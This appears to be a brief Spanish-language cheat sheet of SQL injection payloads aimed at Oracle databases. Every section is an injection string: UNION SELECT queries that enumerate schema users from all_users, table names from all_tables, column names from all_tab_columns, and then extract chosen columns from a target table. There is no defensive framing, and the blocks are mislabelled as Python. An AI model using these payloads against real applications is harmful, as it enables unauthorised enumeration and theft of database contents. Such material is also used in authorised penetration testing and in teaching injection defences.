

# Obtener los nombres de todos los esquemas en la base de datos Oracle

```python
' union select NULL,username from all_users--
```


# Tablas

```python
' union select NULL,table_name from all_tables--
```

# Columnas

```python
' union select NULL,column_name from all_tab_columns where table_name=''--
```


# Campos

```python
' union select columna1,columna2 from tabla--
```

